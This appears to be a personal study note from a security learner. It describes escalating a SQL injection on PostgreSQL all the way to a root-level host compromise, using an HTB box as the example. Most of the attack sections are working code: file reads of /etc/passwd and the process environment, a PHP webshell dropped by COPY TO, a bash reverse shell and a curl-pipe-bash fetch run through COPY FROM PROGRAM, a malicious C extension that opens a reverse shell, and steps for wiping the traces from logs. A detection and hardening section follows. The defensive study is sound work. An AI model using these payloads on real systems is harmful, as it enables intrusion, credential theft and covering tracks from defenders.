# SQLi → RCE on PostgreSQL (The Full Escalation Ladder)
Tags: #chain #sqli #postgresql #rce #post-exploitation #escalation #day4

## The Attack Narrative

You found a SQL injection. That's the headline. Now comes the question that separates a bug-finder from an attacker: **how far does it actually go?**

The answer on a PostgreSQL-backed app is almost always *all the way*. SQLi is rarely the prize — it's the front door. From a single injection point, the climb runs:

```
LEVEL 0  ─ Confirm there's a bug                       (' breaks the query)
LEVEL 1  ─ Read arbitrary data from any table          (UNION / error / blind)
LEVEL 2  ─ Read arbitrary FILES from the OS            (COPY ... FROM '/etc/passwd')
LEVEL 3  ─ Write arbitrary FILES to the OS             (COPY ... TO  /  large objects)
LEVEL 4  ─ Execute arbitrary COMMANDS                  (COPY FROM PROGRAM  /  C extension)
LEVEL 5  ─ Interactive shell as the database user      (reverse shell  →  privilege escalation)
```

Each level uses the previous one. None of them require a second vulnerability — they all live inside features PostgreSQL ships with on purpose. The narrative below is the BlueBird-shaped version of the climb. Same shape applies to every PostgreSQL deployment that runs as a non-trivial OS user with `superuser` privileges (which is the default install).

### Act I — Find the door (Levels 0–1)

The starting point is the same as any other SQLi engagement. Static review shows a controller that concatenates `email` into a `WHERE` clause. The black-box probe is `' or 1=1--@something.tld` (the email-shape regex bypass — see [[SQL Injection]] → "Satisfying the Shape, Smuggling the Intent"). The query log confirms it.

Now you know the bug exists, but the page is silent — it's a forgot-password endpoint. So you flip the debug-gated catch block with `X-Forwarded-For: 127.0.0.1` (see [[Client-Controlled IP Headers]] and [[Debug Mode Disclosure]]) and the database errors start rendering. Suddenly blind SQLi becomes error-based SQLi. You leak the schema with `CAST((SELECT ...) AS int)` and dump the password table.

You have data exfiltration. **Most engagements stop here.** This is where the attacker keeps climbing.

### Act II — Confirm you're a superuser (the gating check)

Before spending one minute on file primitives, you ask the database who you are:

```sql
SELECT current_user, current_setting('is_superuser');
```

If `is_superuser = on`, the rest of the chain is unlocked. PostgreSQL ships with the application user as superuser by default in most distro packages, in nearly every CTF box, and in a depressing percentage of real production deployments. If it returns `off`, the climb is harder but not impossible — `pg_read_server_files` and `pg_write_server_files` roles can be granted independently, and CVE-2018-1058 / CVE-2019-9193 / CVE-2022-1552 each open variants for non-superusers.

> **The gate question:** "Am I superuser?" If yes, levels 2–5 are 60 seconds of typing. If no, you need a privilege bug or a misconfigured role grant first.

### Act III — Read files (Level 2)

PostgreSQL ships two ways to read from the filesystem with one statement each:

```sql
-- Way 1: COPY into a temporary table
CREATE TEMP TABLE leak (data text);
COPY leak FROM '/etc/passwd';
SELECT * FROM leak;

-- Way 2: large object import (returns the file as a numeric OID)
SELECT lo_import('/etc/passwd');           -- → 16384
SELECT data FROM pg_largeobject WHERE loid = 16384 ORDER BY pageno;
```

You stack these on top of the SQLi. If the channel is error-based, wrap them in `CAST((SELECT data FROM leak LIMIT 1) AS int)` and the file content lands in your error message.

The first thing you read is *always*:

| File | Why |
|---|---|
| `/etc/passwd` | Confirms read works, lists OS users, tells you the home directory of the postgres user |
| `/proc/self/environ` | Environment variables of the postgres process — DB credentials, AWS creds, JWT secrets |
| `/proc/self/cmdline` | Exact command line of the postgres process — config flags, data dir |
| `~postgres/.bash_history` | Free DBA reconnaissance |
| `/var/lib/postgresql/data/postgresql.conf` | Confirms data directory, log paths, extension dirs |
| `/var/lib/postgresql/data/pg_hba.conf` | Authentication rules — sometimes leaks `trust` lines |
| `/var/lib/postgresql/data/log/postgresql-*.log` | The query log (see [[PostgreSQL Query Logs]]) — credentials passed as literals during login |
| `/root/.ssh/authorized_keys` (if pg runs as root, which happens) | Game over without further work |

### Act IV — Write files (Level 3)

PostgreSQL has *three* ways to write a file. Each has strengths.

```sql
-- Way 1: COPY out of a query (great for ASCII files)
COPY (SELECT '<?php system($_GET[''c'']); ?>') TO '/var/www/html/shell.php';

-- Way 2: large object export (great for binaries — pages of 2KB each)
SELECT lo_create(1337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('7f454c46...', 'hex'));
SELECT lo_export(1337, '/tmp/payload.so');

-- Way 3: stack a CREATE FUNCTION + UTL trick on supported builds
-- (less common, version-dependent)
```

The large object route is the one that matters for RCE because it can write arbitrary bytes — including a compiled `.so` file — at any path the postgres OS user can write to. The 2KB page limit just means you split the binary into chunks and INSERT each chunk as a row.

The first thing you write is *always* a payload that's going to give you code execution at the next level.

### Act V — Execute commands (Level 4)

Two paths, both built into PostgreSQL on purpose.

#### Path A: COPY FROM PROGRAM (the cheat code)

```sql
CREATE TEMP TABLE pwn (output text);
COPY pwn FROM PROGRAM 'id; uname -a; whoami';
SELECT * FROM pwn;
```

This is **the** PostgreSQL post-exploitation primitive. `COPY ... FROM PROGRAM` runs an arbitrary shell command as the postgres OS user and pipes stdout into a table. It is not a vulnerability — when CVE-2019-9193 was filed, the PostgreSQL team famously responded *"this is a feature."* Superuser privilege is the boundary; if you have it, the database is supposed to be able to invoke OS commands. That's by design. The fact that "I have superuser via SQLi" doesn't surprise the design is the whole problem.

Variants for filtered environments:

```sql
COPY pwn FROM PROGRAM 'bash -c "id"';
COPY pwn FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
COPY pwn FROM PROGRAM 'curl http://attacker/x.sh|bash';
```

Single statement. Single round trip. RCE.

#### Path B: C extension (the textbook escalation)

When `COPY FROM PROGRAM` is blocked (some hardened builds disable it, some WAFs catch the literal `FROM PROGRAM` substring), you fall back to writing your own C extension and loading it. This is the canonical PostgreSQL exploitation move and the one worth understanding even if you never need it, because it teaches the *mental model* (see [[Database as a Process]]).

```c
// pwn.c
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(pwn);
Datum pwn(PG_FUNCTION_ARGS) {
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'");
    PG_RETURN_VOID();
}
```

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pwn.so pwn.c
```

Then via SQLi:

```sql
-- 1. Write the .so to disk via large objects (Level 3)
SELECT lo_create(31337);
-- ... INSERT pages of pwn.so into pg_largeobject ...
SELECT lo_export(31337, '/tmp/pwn.so');

-- 2. Tell PostgreSQL to load it as a function
CREATE OR REPLACE FUNCTION pwn() RETURNS void
    AS '/tmp/pwn.so', 'pwn'
    LANGUAGE C STRICT;

-- 3. Call it
SELECT pwn();
```

The reverse shell connects back. You're now in the postgres OS user's shell. The chain is complete.

### Act VI — Establish shell, then climb the OS (Level 5)

A reverse shell as the postgres user is *not* the end. It's a new beginning — you've crossed from "I can talk to the database" to "I'm a process on the database server." Everything you'd do post-foothold on any Linux box now applies:

- `id` and `groups` to see what the postgres user can touch
- `sudo -l` (often gives unexpected escalation)
- SUID binaries
- Cron jobs running as root
- Kernel exploits if old enough
- Reading credentials out of other processes' env vars
- Pivoting to other internal hosts the database can reach

The database was a means to an end. The end is "compromise the host."

### Act VII — Cleanup (the part beginners skip)

Real engagements clean up. Otherwise the next dev/admin/DFIR team sees obvious tracks:

```sql
DROP FUNCTION IF EXISTS pwn();
SELECT lo_unlink(31337);
DROP TABLE IF EXISTS pwn;
DROP TABLE IF EXISTS leak;
-- Optionally rotate the postgres log file or selectively remove your statements
```

If you're on a real engagement (not a CTF) you also document every command you ran with timestamps. If something breaks tomorrow, the client wants to know whether it was you or someone else.

## Why Each Link Works

Every level uses a feature PostgreSQL ships on purpose — bulk CSV loading (file read), query export (file write), external tool integration (COPY FROM PROGRAM), extension loading (LANGUAGE C). None of them are bugs. Superuser is the trust boundary. The architectural reason this chain is inevitable lives in [[Database as a Process]] — the short version: a database is a Linux process, and the OS gives it `open()`, `write()`, `system()`, and outbound `connect()` like any other daemon. SQL is just the API.

## The Developer's Blind Spot

Developers see "PostgreSQL" and think *database*. They don't think *process running as a Linux user with read/write access to the disk and the ability to fork shell commands*. The two things are the same thing. The blind spot is treating the database as an isolated black box you talk to over a wire, when in reality it's a service that the OS gives the same superpowers any other long-running daemon gets.

The same blind spot is what makes the climb shocking the first time you see it. It feels like "the attacker keeps unlocking new abilities" but actually the attacker is using one capability — superuser inside the database — and walking through doors that PostgreSQL was *built* with open.

> **The forever-hook:** "A database is not a black box. It's a Linux process. If your SQLi gives you the database superuser, it gives you the OS user the database is running as. And that user has files, an environment, and a `system()` call."

Three structural decisions create this:

1. **Superuser-by-default at install time.** Distro packages create the postgres user, give it superuser, and the application connects as that user because the install scripts say to.
2. **No sandbox between the DB process and the OS.** PostgreSQL was designed to run on a host the DBA controls, not in a hostile environment. There's no chroot, no seccomp, no AppArmor — and the maintainers don't see that as a bug.
3. **Application-level credentials = database-level identity.** The application's connection string IS the attacker's identity once SQLi happens. There's no second authentication layer between "code in the application" and "queries in the database." The code is the credential.

Each one is defensible in isolation. Together they mean *every SQLi on a default PostgreSQL install is one paste away from RCE*.

## Detection and Prevention

### What to look for (defender)

These are the moves an attacker makes climbing the ladder. Each one is detectable in the database log if you're collecting it:

```sql
-- Reconnaissance after a SQLi
SELECT current_user, current_setting('is_superuser');
SELECT version();
SELECT * FROM pg_user;

-- File read primitives
COPY %% FROM '/                              -- any COPY FROM with an absolute path
SELECT lo_import(                            -- any large object import
SELECT %% FROM pg_largeobject

-- File write primitives
COPY (%%) TO '/                              -- any COPY ... TO with an absolute path
SELECT lo_create(                            -- large object create followed by inserts
INSERT INTO pg_largeobject

-- Command execution
COPY %% FROM PROGRAM                         -- highest signal — almost no legitimate app uses this
CREATE FUNCTION %% LANGUAGE C                -- C extension load
LOAD '/tmp/                                  -- alternate extension load syntax
```

A single grep across `postgresql-*.log` for `FROM PROGRAM` and `LANGUAGE C` will catch the loud part of every CTF-style exploit. Real engagements may use stealthier variants, but the basic surface is small enough to alert on.

### Hardening (developer / DBA)

The fix is layered — no single mitigation closes all five levels. Every row in the table below is one application of the [[Principle of Least Privilege]] at a different layer of the stack. PoLP is the unifying defensive discipline; the table is what it looks like in practice for this specific chain.

> **Forever-hook:** "The exploitability of a SQLi is determined by the bug. The blast radius is determined by least privilege."

| Mitigation | Closes which level | Why it works |
|---|---|---|
| **Parameterize every query** ([[SQL Injection]]) | Level 0 — kills the chain at the source | No SQLi means no privilege to start with |
| **Application user is NOT superuser** | Levels 2–4 | `COPY`, `lo_import`, `LANGUAGE C` all require superuser or specific role grants |
| **Revoke `pg_read_server_files`, `pg_write_server_files`, `pg_execute_server_program` from the app role** | Level 2/3/4 | Even if you slip up on superuser, these specific roles gate the dangerous primitives |
| **Run postgres as a dedicated OS user with minimal filesystem permissions** | Level 5 | Even if the database is owned, the OS user can't read /root or escalate trivially |
| **Disable `COPY FROM PROGRAM` at the database level** (`ALTER SYSTEM SET ...`) where supported, or via build flags | Level 4 | Removes the cheat-code path |
| **Filesystem-level controls — read-only mounts for `/var/lib/postgresql`, AppArmor/SELinux profiles** | Levels 2/3 | OS refuses the syscall regardless of the database |
| **Enable query logging and alert on `FROM PROGRAM`, `LANGUAGE C`, `lo_import`, `lo_export`** | Detection at every level | The post-exploit moves are loud if you're listening |
| **Restrict outbound network from the DB host** (egress firewall) | Level 5 | Reverse shells need to dial out — block them at the perimeter |

The "right" answer is **all of the above, in layers**. Any single one of these would have stopped Heartland, MOVEit, and BlueBird. The reason none of them were in place at the time of the breach is the same reason they're missing from most production deployments today: PoLP is invisible until it's the only thing standing between a bug and a CVE in tomorrow's news. See [[Principle of Least Privilege]] for the broader discipline this table is one instance of.

## Source

- HTB BlueBird — the canonical Spring Boot + PostgreSQL chain that motivated this note
- PostgreSQL documentation for `COPY`, `lo_import`/`lo_export`, `CREATE FUNCTION ... LANGUAGE C`
- CVE-2019-9193 (`COPY FROM PROGRAM` — closed as "this is a feature")
- The `pgsql-injector` and `sqlmap --os-shell` source code as canonical implementations of the climb
- PortSwigger SQLi to RCE labs (PostgreSQL track)

## My Notes
